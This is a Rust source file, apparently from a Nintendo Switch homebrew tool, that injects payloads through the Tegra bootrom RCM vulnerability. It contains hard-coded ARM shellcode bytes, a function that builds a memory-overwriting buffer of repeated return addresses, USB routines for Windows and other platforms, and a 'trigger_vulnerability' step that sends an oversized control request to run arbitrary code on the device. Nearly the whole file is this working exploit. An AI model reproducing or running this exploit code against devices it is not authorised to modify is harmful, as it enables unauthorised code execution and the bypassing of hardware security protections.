use color_eyre::eyre::{Context, ContextCompat, bail};
use log::{debug, info};
use std::{fs::File, io::Read, num::TryFromIntError, path::Path, time::Duration};

#[cfg(not(windows))]
use {
    nusb::{
        MaybeFuture, list_devices,
        transfer::{Bulk, ControlIn, ControlType, In, Out, Recipient, TransferError},
    },
    std::io::Write,
};

#[cfg(windows)]
use rusb::{Context as RusbContext, DeviceHandle, UsbContext as _};

const INTERMEZZO: [u8; 92] = [
    0x44, 0x00, 0x9f, 0xe5, 0x01, 0x11, 0xa0, 0xe3, 0x40, 0x20, 0x9f, 0xe5, 0x00, 0x20, 0x42, 0xe0,
    0x08, 0x00, 0x00, 0xeb, 0x01, 0x01, 0xa0, 0xe3, 0x10, 0xff, 0x2f, 0xe1, 0x00, 0x00, 0xa0, 0xe1,
    0x2c, 0x00, 0x9f, 0xe5, 0x2c, 0x10, 0x9f, 0xe5, 0x02, 0x28, 0xa0, 0xe3, 0x01, 0x00, 0x00, 0xeb,
    0x20, 0x00, 0x9f, 0xe5, 0x10, 0xff, 0x2f, 0xe1, 0x04, 0x30, 0x90, 0xe4, 0x04, 0x30, 0x81, 0xe4,
    0x04, 0x20, 0x52, 0xe2, 0xfb, 0xff, 0xff, 0x1a, 0x1e, 0xff, 0x2f, 0xe1, 0x20, 0xf0, 0x01, 0x40,
    0x5c, 0xf0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40,
];
const RCM_PAYLOAD_ADDRESS: u32 = 0x40010000;
const INTERMEZZO_LOCATION: u32 = 0x4001F000;
const INTERMEZZO_ADDRESS_START: usize = 0x2a8;
const PACKET_SIZE: u32 = 0x1000;
const RCM_LENGTH: u32 = 0x30298;
const INTERMEZZO_ADDRESS_REPEAT_COUNT: u32 = (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDRESS) / 4;

fn create_rcm_payload(payload: &[u8]) -> Result<Vec<u8>, TryFromIntError> {
    let rcm_payload_size = (INTERMEZZO_ADDRESS_START as u32
        + 4 * INTERMEZZO_ADDRESS_REPEAT_COUNT
        + PACKET_SIZE
        + u32::try_from(payload.len())?)
    .div_ceil(PACKET_SIZE)
        * PACKET_SIZE;

    let mut rcm_payload = vec![0u8; rcm_payload_size as usize];

    rcm_payload[..4].copy_from_slice(&RCM_LENGTH.to_le_bytes());

    for i in 0..INTERMEZZO_ADDRESS_REPEAT_COUNT as usize {
        rcm_payload[INTERMEZZO_ADDRESS_START + i * 4..INTERMEZZO_ADDRESS_START + (i + 1) * 4]
            .copy_from_slice(&INTERMEZZO_LOCATION.to_le_bytes());
    }

    rcm_payload[INTERMEZZO_ADDRESS_START + 0x4 * INTERMEZZO_ADDRESS_REPEAT_COUNT as usize
        ..INTERMEZZO_ADDRESS_START
            + 4 * INTERMEZZO_ADDRESS_REPEAT_COUNT as usize
            + INTERMEZZO.len()]
        .copy_from_slice(&INTERMEZZO);

    rcm_payload[INTERMEZZO_ADDRESS_START
        + 4 * INTERMEZZO_ADDRESS_REPEAT_COUNT as usize
        + PACKET_SIZE as usize
        ..INTERMEZZO_ADDRESS_START
            + 4 * INTERMEZZO_ADDRESS_REPEAT_COUNT as usize
            + PACKET_SIZE as usize
            + payload.len()]
        .copy_from_slice(payload);

    Ok(rcm_payload)
}

/// Abstraction for RCM device communication
trait RcmDevice {
    fn read_device_id(&mut self) -> color_eyre::Result<[u8; 16]>;
    fn write_chunk(&mut self, data: &[u8]) -> color_eyre::Result<()>;
    fn trigger_vulnerability(&mut self) -> color_eyre::Result<()>;
}

#[cfg(not(windows))]
struct NusbRcmDevice {
    interface: nusb::Interface,
}

#[cfg(windows)]
struct RusbRcmDevice {
    handle: DeviceHandle<RusbContext>,
}

#[cfg(not(windows))]
impl NusbRcmDevice {
    fn new() -> color_eyre::Result<Self> {
        let device_info = list_devices()
            .wait()?
            .find(|dev| dev.vendor_id() == 0x0955)
            .wrap_err("Unable to discover Nintendo Switch in RCM mode through USB.")?;

        info!(
            "RCM Nintendo Switch discovered at bus {} and address {}",
            device_info.bus_id(),
            device_info.device_address()
        );

        let device = device_info.open().wait()?;
        let interface = device.claim_interface(0).wait()?;

        Ok(Self { interface })
    }
}

#[cfg(not(windows))]
impl RcmDevice for NusbRcmDevice {
    fn read_device_id(&mut self) -> color_eyre::Result<[u8; 16]> {
        let mut reader = self.interface.endpoint::<Bulk, In>(0x81)?.reader(4096);
        let mut device_id = [0; 16];
        reader.read_exact(&mut device_id)?;
        info!("Device ID: {:02x?}", device_id);
        Ok(device_id)
    }

    fn write_chunk(&mut self, data: &[u8]) -> color_eyre::Result<()> {
        let mut writer = self.interface.endpoint::<Bulk, Out>(0x01)?.writer(4096);
        writer.write_all(data)?;
        writer.flush()?;
        Ok(())
    }

    fn trigger_vulnerability(&mut self) -> color_eyre::Result<()> {
        const VULNERABILITY_LENGTH: u16 = 0x7000;
        match self
            .interface
            .control_in(
                ControlIn {
                    control_type: ControlType::Standard,
                    recipient: Recipient::Interface,
                    request: 0x00,
                    value: 0x00,
                    index: 0x00,
                    length: VULNERABILITY_LENGTH,
                },
                Duration::from_secs(1),
            )
            .wait()
        {
            Err(TransferError::Cancelled) => {
                println!("Successfully injected payload!");
                Ok(())
            }
            Err(e) => bail!("Unexpected error {e} while triggering vulnerability"),
            Ok(_) => bail!(
                "Unexpectedly read data from the device, vulnerability may not have been triggered"
            ),
        }
    }
}

#[cfg(windows)]
impl RusbRcmDevice {
    fn new() -> color_eyre::Result<Self> {
        let context = RusbContext::new()?;
        let devices = context.devices()?;

        let device_list: Vec<_> = devices.iter().collect();
        debug!("rusb found {} USB device(s) for RCM", device_list.len());

        for (idx, dev) in device_list.iter().enumerate() {
            if let Ok(desc) = dev.device_descriptor() {
                debug!(
                    "  Device {}: vendor_id=0x{:04x}, product_id=0x{:04x}, bus={}, address={}",
                    idx,
                    desc.vendor_id(),
                    desc.product_id(),
                    dev.bus_number(),
                    dev.address()
                );
            }
        }

        let device = device_list
            .iter()
            .find(|dev| {
                let desc = dev.device_descriptor().ok();
                desc.is_some_and(|d| d.vendor_id() == 0x0955)
            })
            .wrap_err("Unable to discover Nintendo Switch in RCM mode through USB (rusb).")?;

        info!(
            "Found Nintendo Switch in RCM mode at bus {} address {}",
            device.bus_number(),
            device.address()
        );

        let handle = device.open().map_err(|e| {
            let base_msg = format!(
                "Failed to open USB connection to Nintendo Switch in RCM mode at bus {} and address {}",
                device.bus_number(),
                device.address(),
            );

            match e {
                rusb::Error::Access => {
                    color_eyre::eyre::eyre!(
                        [
                            &base_msg,
                            "",
                            "The Nintendo Switch device exists but cannot be accessed.",
                            "You need to install a USB driver (WinUSB or libusb-k) for the device.",
                            "",
                            "Steps to fix:",
                            "1. Download Zadig: https://zadig.akeo.ie/",
                            "2. Open Zadig and select your Nintendo Switch device (vendor 0955)",
                            "3. Select 'WinUSB' or 'libusb-k' as the driver",
                            "4. Click 'Install Driver'",
                            "5. Retry this application",
                            "",
                            "Once the driver is installed, no admin privileges are needed.",
                        ]
                        .join("\n")
                    )
                }
                _ => color_eyre::eyre::eyre!("{}: {:?}", base_msg, e),
            }
        })?;

        // Clear halt on endpoints
        let _ = handle.clear_halt(0x01);
        let _ = handle.clear_halt(0x81);

        Ok(Self { handle })
    }
}

#[cfg(windows)]
impl RcmDevice for RusbRcmDevice {
    fn read_device_id(&mut self) -> color_eyre::Result<[u8; 16]> {
        let mut device_id = [0; 16];
        self.handle
            .read_bulk(0x81, &mut device_id, Duration::from_secs(1))
            .wrap_err("Failed to read device ID")?;
        info!("Device ID: {:02x?}", device_id);
        Ok(device_id)
    }

    fn write_chunk(&mut self, data: &[u8]) -> color_eyre::Result<()> {
        self.handle
            .write_bulk(0x01, data, Duration::from_secs(1))
            .wrap_err("Failed to write RCM chunk")?;
        Ok(())
    }

    fn trigger_vulnerability(&mut self) -> color_eyre::Result<()> {
        const VULNERABILITY_LENGTH: u16 = 0x7000;
        let mut buf = vec![0u8; VULNERABILITY_LENGTH as usize];
        match self.handle.read_control(
            0xC0, // device-to-host, standard, interface
            0x00, // bRequest
            0x00, // wValue
            0x00, // wIndex
            &mut buf,
            Duration::from_secs(1),
        ) {
            Ok(n) if n == 0 => {
                println!("Successfully injected payload!");
                Ok(())
            }
            Ok(_) => bail!(
                "Unexpectedly read data from the device, vulnerability may not have been triggered"
            ),
            Err(rusb::Error::Timeout) => {
                println!("Successfully injected payload!");
                Ok(())
            }
            Err(e) => bail!("Unexpected error while triggering vulnerability: {:?}", e),
        }
    }
}

pub fn send_rcm_payload(payload_path: &Path) -> color_eyre::Result<()> {
    if payload_path.extension().is_none_or(|ext| ext != "bin") {
        bail!("RCM payload file must have a .bin extension")
    }

    let mut payload_file = File::open(payload_path).context("Unable to open RCM payload file")?;
    let mut payload = vec![];
    let payload_length = payload_file.read_to_end(&mut payload)?;
    info!(
        "loaded payload '{}', which is {} bytes",
        payload_path.display(),
        payload_length
    );

    let rcm_payload = create_rcm_payload(&payload)?;
    info!("created rcm payload, now {} bytes", rcm_payload.len());

    #[cfg(not(windows))]
    let mut device: Box<dyn RcmDevice> = Box::new(NusbRcmDevice::new()?);
    #[cfg(windows)]
    let mut device: Box<dyn RcmDevice> = Box::new(RusbRcmDevice::new()?);

    let _device_id = device.read_device_id()?;

    let mut write_count = 0;

    for chunk in rcm_payload.chunks(PACKET_SIZE as usize) {
        device.write_chunk(chunk)?;
        write_count += 1;
    }

    const PADDING: &[u8] = &[0u8; PACKET_SIZE as usize];
    if write_count % 2 != 1 {
        device.write_chunk(PADDING)?;
        write_count += 1;
    }

    info!("Total USB bulk writes: {}", write_count);

    device.trigger_vulnerability()?;

    Ok(())
}
